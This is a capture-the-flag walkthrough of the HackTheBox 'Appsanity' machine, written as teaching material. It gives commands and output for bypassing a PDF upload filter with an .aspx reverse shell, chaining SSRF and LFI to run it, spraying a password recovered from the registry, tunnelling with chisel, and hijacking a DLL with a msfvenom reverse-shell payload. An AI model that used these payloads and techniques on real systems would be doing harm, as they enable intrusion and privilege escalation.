---
title: "HackTheBox - Appsanity"
date: 2024-03-09T20:49:21-06:00
tags: ["Cookie","Magic Byte","Upload Bypass","SSRF","LFI","DLL Analysis","dnSpy","Exe Analysis","ProcMon","DLL Hijack"]
description: "Appsanity is a hard difficulty box with a flawed patient registration system. Any user can register as a privileged doctor account by altering the hidden Accttype variable. With a doctor account, the login cookies can be transferred to authenticate on a doctor-only subdomain. In this subdomain, we are able to upload a malicious .aspx file by appending a PDF magic byte to bypass the upload filter. The malicious .aspx file can be accessed by using SSRF techniques on another submission form that allows for website links. Using this method to achieve RCE, we are able to establish a reverse shell onto the system. Once inside, we might find a suspicious custom .dll file. When disassembled, it becomes apparent that a secret credential is stored as a reg key. The reg key is also used as another user's credentials, which we can now access as well. Lastly for privilege escalation, we might notice an interactive RemoteManagement console is expecting a certain dll, and we can perform DLL hijacking to perform RCE as the Administrator user."
image: "Appsanity.png"
categories: ["Hack The Box"]
---
## Enumeration
Initial nmap:
```
Nmap scan report for 10.129.154.179
Host is up (0.059s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds
```
We see Microsoft IIS on port 80/443, and port 5985 - the WinRM port- open. With such a small attack surface, this is likely a web-based entrypoint. First we must add `meddigi.htb` to our hosts file:
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.154.179 meddigi.htb
```
In an interesting start, it appears http access is not allowed:
```
┌──(kali㉿kali)-[~]
└─$ curl http://meddigi.htb/                                                 
<head><title>Document Moved</title></head>
<body><h1>Object Moved</h1>This document may be found <a HREF="https://meddigi.htb/">here</a></body>
```
We are redirected to https.

![Landing Page](Images/landingpage.png)

There is an option for login/register here, and further down the main page a section where we might "request a call-back". Handling a fake number calling method is something I know very little about, so I start with checking out the sign in/sign up pages:
### Enumerating account registration

![](Images/signup.png)

Upon login, we enter the Profile page, where we might edit our own information or perhaps send a message to supervisors:

![](Images/ProfilePage.png)

When we check the request contents for changing account information, we see a RequestVerificationToken. If this is implemented correctly, we cannot try changing another user's account information. 

![](Images/ProfileEdit1.png)

Request data:
```
Name=asdf&LastName=asdf&Email=asdf%40asdf.asdf&PhoneNumber=1234567890&Password=Appsanity&ConfirmPassword=Appsanity1&__RequestVerificationToken=CfDJ8HpmXdLrgsRMlajdq9P0hbKlkYzqet5VlcN2s9Era-YfuLJbHOjhX49GbZsoiy2SUrOp5HavzSiljfijL_S159CPXuIujVO9vADztksoVOpBKO8veQrv2oRdBeupiV-0k2-8h9rMTAUm5RcQirzr5hd1WOVTlZMAik1CxCftgdtyf_4vzJWXPpYcVtQ7xH_TLA
```

We can send something to Supervisors, but it appears we don't have a way to view our request. Currently, the best we can probably do is send an XSS payload either in this message location, or perhaps earlier on the call-back form. 
### Discovery of portal subdomain
We can try `gobuster` to enumerate subdomains:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ gobuster vhost -u https://meddigi.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://meddigi.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: portal.meddigi.htb Status: 200 [Size: 2976]
```

We can find another at `portal.meddigi.htb`:

![](Images/portalpage.png)

There is not much we can do here, and directory fuzzing didn't show us anything else we might view without valid credentials first.
### Examining authenitcation token
Decoding our JWT token might be interesting. Note in this token I am decoding another account I tried (and successfully made), with the email `admin@appsanity.htb`. The goal was to see if I could find potentially existing usernames, which didn't work out.

![](Images/jwt.png)

```
{
  "unique_name": "7",
  "email": "admin@appsanity.htb",
  "nbf": 1698539553,
  "exp": 1698543153,
  "iat": 1698539553,
  "iss": "MedDigi",
  "aud": "MedDigiUser"
}
```
Normally JWT tokens are signed with an internal key (blue text) and the signing method is described in the header (red text). An occasional misconfiguration might be a situation where the signature is never actually verified, or will accept an signing algorithm type of "None". In these situations we might forge our own token to assume the identity of another user. Unfortunately, this does not work for us. When I edit my `unique_name` to be that of an earlier user, for example 1, my authentication is rejected and I am placed outside of authentication pages.
### Editing hidden variable in registration
When making account notice the final variable, acctype:
![](Images/signup1.png)

```
Name=asdf&LastName=asdf&Email=admin1%40appsanity.htb&Password=Appsanity1&ConfirmPassword=Appsanity1&DateOfBirth=1999-01-01&PhoneNumber=1234567890&Country=asdf&Acctype=1&
```
This is a patient account type. However, we can just manually change the value to 2. Now we have higher privileges:

![](Images/supervise1.png)

My new account is considered a Doctor, and I have the new option of adding patients. When I add myself as supervising my older account, I can now see it upon logging in as the other user. At this point, it's looking like a lot of back-and-forth. To make the process a little easier, I opened a new incognito tab to flush cookies, and in that tab logged in as the patient user while in my original tab I am the supervisor user.

![](Images/supervise2.png)

Although I can send a message to my supervisor, I'm not seeing any way to interact with the message.

### Accessing portal subdomain through cookie re-use

Although we don't have the access token to log into `portal.meddigi.htb`, we have a valid access token for the main site. When I try to add my valid cookie to portal, it lets me in:

![](Images/tokentransplant.png)

### File upload potential in portal subdomain
Notably interesting, the upload exam report section
Only pdf is allowed. Is this magic byte verification?

![](Images/pdfonly.png)

We can add magic byte to trick the upload:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ head shell.aspx
%PDF-1.5
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ file shell.aspx 
shell.aspx: PDF document, version 1.5
```
By doing this, our payload is accepted.

![](Images/upload.png)

### Remote connection possible in Prescription Link submission

On the `Issue Prescriptions` tab, there is an option to submit a prescription link. When we supply our own address, we can get a connection back:

![](Images/prescriptionlink.png)

```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ nc -nvlp 80     
listening on [any] 80 ...
connect to [10.10.14.134] from (UNKNOWN) [10.129.154.179] 56535
GET /asdf HTTP/1.1
Host: 10.10.14.134
traceparent: 00-d84be00c1219df2a746a0b1f8660d6fa-ed08423e51158377-00
```

Unfortunately, only http and https methods are allowed. Additionally, no NTLM authentication is sent for Responder capturing.

### SSRF potential in Prescription Link
Although the responses on web pages are somewhat unintuitive, we might discover that SSRF is possible. The most obvious way to see this is by sending an http request to the Win-RM port, as it shows a `404 not found` error:

![](Images/ssrfwinrm.png)

Unlike a lot of ports that hang on http requests, winrm will always respond with this `404`. This is nice to see, because strangely enough sending requests to port 80 or 443 does not work well.

### Fuzzing internal ports via SSRF
Since we know we are accessing ports internally, we might find a port open only for internal requests. We can fuzz for this. For whatever reason, `ffuf` will not fuzz properly, so I chose to fuzz using a for loop with `curl`:
```bash
for i in {1..65535}; echo $i; do curl -s 'https://portal.meddigi.htb/Prescriptions/SendEmail' -b 'access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjkiLCJlbWFpbCI6ImFzZGYxQGFzZGYuYXNkZiIsIm5iZiI6MTY5OTA1MTYzMywiZXhwIjoxNjk5MDU1MjMzLCJpYXQiOjE2OTkwNTE2MzMsImlzcyI6Ik1lZERpZ2kiLCJhdWQiOiJNZWREaWdpVXNlciJ9.j3hHqxHUFtMWtxy52NIeCbaYG-CluoOubN1_kOTJ2YM; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8CrSHtzBF1JNhsF1CyVvUorTLizskLt_8YolzUh3Z-GepR2ZGiTyxSHB4G4ksqt6mFe3ajKZtH5kaY75bmGRptGuDdZqAGUaB6B-N0vKM8s-b6gBw9RcZJRuwqCSP-gjpKwsNqgEflJpT4_DBTPmm_k' -d "Email=asdf@asdf.asdf&Link=http://127.0.0.1:$i" -k; done
```
The method is ridiculously slow, but it does get the job done.
```
<...SNIP...>
5984
5985
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Not Found</h2>
<hr><p>HTTP Error 404. The requested resource is not found.</p>
</BODY></HTML>
<...SNIP...>
8078
8079
8080


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Examinations Panel</title>
    <style>
        /* Center the table on the page */
        table {
            margin: 0 auto;
        }
        /* Optional: If you want to set a max width and ensure the table does not stretch full screen */
        body {
            max-width: 1200px;
            margin: 0 auto;
        }
    </style>
</head>
<body>
<...SNIP...>
```
We can see our previously tested WinRM port returning a `404`, and also a page response on port 8080.
## Foothold
### Remote Shell access via SSRF + LFI vulnerabilities

When submitting the link to internal port 8080 through the traditional web browser, we can see the response as a preview popup:

![](Images/ssrf1.png)

We can scroll to the left of the table, and we see a hyperlink for our upload:

![](Images/linkpreview.png)

`https://portal.meddigi.htb/ViewReport.aspx?file=62082e85-664a-4fc8-8eff-c0735d136fe0_shell.aspx`

We can try to access this file using LFI: Note that instead of using the domain name `portal.meddigi.htb`, we must continue using 127.0.0.1:8080.

![](Images/rce1.png)

On my listener port, I receive a connection:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.10.14.194] from (UNKNOWN) [10.10.11.238] 58166
Spawn Shell...
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
appsanity\svc_exampanel
```

We now have a reverse shell, as user `svc_exampanel`. At this point we can acquire the user flag:
```
c:\windows\system32\inetsrv>dir C:\Users\svc_exampanel\Desktop
dir C:\Users\svc_exampanel\Desktop
 Volume in drive C has no label.
 Volume Serial Number is F854-971D

 Directory of C:\Users\svc_exampanel\Desktop

10/18/2023  05:41 PM    <DIR>          .
10/18/2023  05:41 PM    <DIR>          ..
11/03/2023  03:40 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,664,117,760 bytes free
```

## Lateral Movement
### Enumerating the ExaminationPanel
Within the `inetpub`, we can find several services. The MedDigi main page, the subdomain MedDigiPortal, and presumably the internal webpage we SSRF'd as ExaminationPanel:
```
PS C:\inetpub>ls
ls


    Directory: C:\inetpub


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/15/2023   7:22 AM                custerr                                                              
d-----         11/3/2023   5:17 PM                Databases                                                            
d-----         9/24/2023   8:49 AM                ExaminationPanel                                                     
d-----        10/23/2023  12:41 PM                history                                                              
d-----         9/15/2023   7:24 AM                logs                                                                 
d-----         9/24/2023   8:50 AM                MedDigi                                                              
d-----         9/24/2023   9:15 AM                MedDigiPortal                                                        
d-----         9/15/2023   7:22 AM                temp                                                                 
d-----         9/16/2023   9:58 AM                wwwroot
```
Our user cannot access MedDigi or MedDigiPortal
```
PS C:\inetpub\> ls C:\inetpub\MedDigi\
ls C:\inetpub\MedDigi\
ls : Access to the path 'C:\inetpub\MedDigi' is denied.
At line:1 char:1
+ ls C:\inetpub\MedDigi\
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\MedDigi\:String) [Get-ChildItem], UnauthorizedAccessExcept 
   ion
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```
However, ExaminationPanel is accessible. Inside, we see an interesting `bin` folder containing a particularly interesting `dll` with a unique name:
```
PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin> ls
ls


    Directory: C:\inetpub\ExaminationPanel\ExaminationPanel\bin


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/24/2023   8:49 AM                roslyn                                                               
d-----         9/24/2023   8:49 AM                x64                                                                  
d-----         9/24/2023   8:49 AM                x86                                                                  
-a----         9/24/2023   8:46 AM        4991352 EntityFramework.dll                                                  
-a----         9/24/2023   8:46 AM         591752 EntityFramework.SqlServer.dll                                        
-a----         9/24/2023   8:46 AM          13824 ExaminationManagement.dll                                            
-a----         9/24/2023   8:46 AM          40168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll               
-a----         9/24/2023   8:46 AM         431792 System.Data.SQLite.dll                                               
-a----         9/24/2023   8:46 AM         206512 System.Data.SQLite.EF6.dll                                           
-a----         9/24/2023   8:46 AM         206520 System.Data.SQLite.Linq.dll
```
`ExaminationManagement.dll`  is clearly uniquely built for this environment, so it warrants a deeper look. 
### Analyzing ExaminationManagement.dll
We can transfer the file using `impacket-smbserver`, then decompile in a local Windows environment through [dnSpy](https://github.com/dnSpy/dnSpy). First setting up smbserver on kali:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ impacket-smbserver asdf ./ -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Next, copying the file over:
```
PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin> copy .\EntityFramework.dll \\10.10.14.194\asdf\
copy .\EntityFramework.dll \\10.10.14.194\asdf\
```
When we decompile, we can find an interesting behavior on how the service obtains a secret key for encryption; it is querying a registry key.
```cs
private string RetrieveEncryptionKeyFromRegistry()
{
	string result;
	try
	{
		using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
		{
			if (registryKey == null)
			{
				ErrorLogger.LogError("Registry Key Not Found");
				base.Response.Redirect("Error.aspx?message=error+occurred");
				result = null;
			}
```
This registry key should probably be something we can view as well:
```
PS C:\inetpub\examinationpanel\examinationpanel\bin> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MedDigi"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MedDigi"

HKEY_LOCAL_MACHINE\SOFTWARE\MedDigi
    EncKey    REG_SZ    1g0tTh3R3m3dy!!
```

The key looks suspiciously like a password. With WinRM open, we can try a password spray to see if any users have this as their password. First, use `net user` to get a list of users on the system:
```
User accounts for \\APPSANITY

-------------------------------------------------------------------------------
Administrator            DefaultAccount           devdoc                   
Guest                    svc_exampanel            svc_meddigi              
svc_meddigiportal        WDAGUtilityAccount       
The command completed successfully.
```
Since we are trying WinRM, we could also look for which users might have the privilege by being part of the Remote Users group:
```
PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin> net localgroup 'Remote Management Users'
net localgroup 'Remote Management Users'
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
devdoc
The command completed successfully.
```
If this is a password for any user, it is likely for `devdoc`. Fortunately, it is!
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ cme winrm meddigi.htb -u devdoc -p '1g0tTh3R3m3dy!!'               
SMB         meddigi.htb     5985   NONE             [*] None (name:meddigi.htb) (domain:None)
HTTP        meddigi.htb     5985   NONE             [*] http://meddigi.htb:5985/wsman
WINRM       meddigi.htb     5985   NONE             [+] None\devdoc:1g0tTh3R3m3dy!! (Admin!) 
```
## Privilege Escalation
### Discovery of Reports Management Console
When enumerating internal ports, we can find yet another port we have not checked out before:
```
*Evil-WinRM* PS C:\Users\devdoc\Desktop> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING       4776
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       4912
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
  <...SNIP...>
```
Notice the unusual port 100. We could have seen this earlier as `svc_exampanel`, but it is difficult to interact with through the reverse shell. Now with Evil-WinRM, we can easily establish a tunnel using chisel, then interact with the port on our local kali. First, uploading chisel:

```
*Evil-WinRM* PS C:\Users\devdoc\Desktop> upload /opt/chisel/chisel.exe
                                        
Info: Uploading /opt/chisel/chisel.exe to C:\Users\devdoc\Desktop\chisel.exe

Data: 12008104 bytes of 12008104 bytes copied
                                        
Info: Upload successful!
```
On kali, establish a reverse chisel listener:
```
┌──(kali㉿kali)-[/opt/chisel]
└─$ ./chisel server -p 8000 --reverse
2023/11/01 17:00:04 server: Reverse tunnelling enabled
2023/11/01 17:00:04 server: Fingerprint dvjvmDdco0ZHxnPqgpFqF8Jv/zSQPmy1DNlrftgZWWs=
2023/11/01 17:00:04 server: Listening on http://0.0.0.0:8000
```
Finally, connect with `chisel.exe` on the target:
```
.\chisel.exe client 10.10.14.134:8000 R:100:127.0.0.1:100
```
Now we can interact with the port using `nc`:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ nc localhost 100
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
```
We are given several options, and they seem to be related to the Reports folder that we might find back at `C:\inetpub\ExaminationPanel\ExaminationPanel\Reports`. If we look at Program Files, we can find a folder for this Reports Management tool. Note that this is where lateral movement to `devdoc` is necessary, as our other user cannot access this folder:
```
*Evil-WinRM* PS C:\Program Files\ReportManagement> ls


    Directory: C:\Program Files\ReportManagement


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         11/3/2023   5:51 PM                Libraries
-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
-a----         9/17/2023   3:54 AM         140512 profapi.dll
-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
-a----          5/5/2023   5:21 AM         179248 wldp.dll
```
### Analysis of ReportManagement.exe
#### Setting up Process Monitor in Windows
We also can note that `Libraries` folder is writable by us, while the main folder is not.
```
*Evil-WinRM* PS C:\Program Files\ReportManagement> icacls 'C:\Program Files\ReportManagement\Libraries'
C:\Program Files\ReportManagement\Libraries APPSANITY\devdoc:(OI)(CI)(RX,W)
                                            BUILTIN\Administrators:(I)(F)
                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                            BUILTIN\Users:(I)(OI)(CI)(R)
                                            NT SERVICE\TrustedInstaller:(I)(CI)(F)
                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```
`APPSANITY\devdoc:(OI)(CI)(RX,W)` gives us read, execute, and write permissions for this folder. However, we might not think dll hijacking is possible due to the main folder containing all the .dll's that we see, and Libraries is empty. To get a better understanding of what this program is doing, I transferred all files in the folders to a Windows VM, where I can monitor activities using Process Monitor.

For filterings, we can filter by Process Name, containing "ReportManagement."

![](Images/procmonfilter.png)

Now we can run the ReportManagement.exe, to avoid permission conflicts I simply run as administrator. This might not be a good idea if you don't use a virtual machine.

Now, to connect to the open port 100, I used nc.exe:

![](Images/powershellnc.png)

#### Using Process Monitor to track each command
By watching the process monitor, we can see what actions are being taken on each command. For instance, `recover` seems to be looking in the folder `C:\Users\Administrator\Backup`. Additionally, it looks like we can perform directory traversal. However, I wasn't able to get this type of attack working well.

![](Images/dirtrav1.png)

When looking at `upload`, we can see the service accessing files in `Libraries`. Out of all commands, this appears to be the only one doing something with Libraries, the folder we have write permissions over.

![](Images/upload1.png)

When we cat the file contents of the executable, we can see some interesting stuff related to upload as well:
```
upload Invalid command. Missing parameter after 'upload'. Type 'help' for available commands.
%sC:\Program Files\ReportManagement\Libraries.dllexternaluploadFailed to upload to external source.
/c ReportManagementHelper Libraries\c:\Windows\System32\cmd.exeAttempting to upload to external source.
```
This can be more clear in a text editor like vim:

![](Images/externalupload.png)

The file it is searching for is `externalupload.dll`.
We can add a dummy externalupload.dll and see how the program behaves in ProcMon:

```
PS C:\Users\Flare\Desktop> echo 'test' > 'C:\Program Files\ReportManagement\Libraries\externalupload.dll'
```

![](Images/powershellnc2.png)
### Abusing RemoteManagement via DLL hijacking
When we attempt upload again, we see a new message of `Attempting to upload`, and `cmd.exe` is also spawned as well. I thought we would see `externalupload.dll` would be accessed, but maybe we cannot see it while filtering for ReportManager as the process name. Regardless, we know that adding `externalupload.dll` causes additional behaviors that we might abuse.

We can generate a reverse shell payload with `msfvenom`, and deliver it to the Libraries folder:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.134 LPORT=8080 -f dll -o externalupload.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1879 bytes
Final size of dll file: 9216 bytes
Saved as: externalupload.dll
```
Uploading the file:
```
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> upload externalupload.dll

Info: Uploading /home/kali/Documents/Appsanity/externalupload.dll to C:\Program Files\ReportManagement\Libraries\externalupload.dll                                                                                               

Data: 12288 bytes of 12288 bytes copied

Info: Upload successful!
```
Lastly, attempting to call upload:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ nc localhost 100
Reports Management administrative console. Type "help" to view available commands.
upload asdf
Attempting to upload to external source.
```
Meanwhile on my listener:
```
┌──(kali㉿kali)-[~/Documents/Appsanity]
└─$ nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.10.14.194] from (UNKNOWN) [10.10.11.238] 61785
Windows PowerShell running as user Administrator on APPSANITY
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
appsanity\administrator
PS C:\Program Files\ReportManagement>
```
Finally, we have access as Administrator!
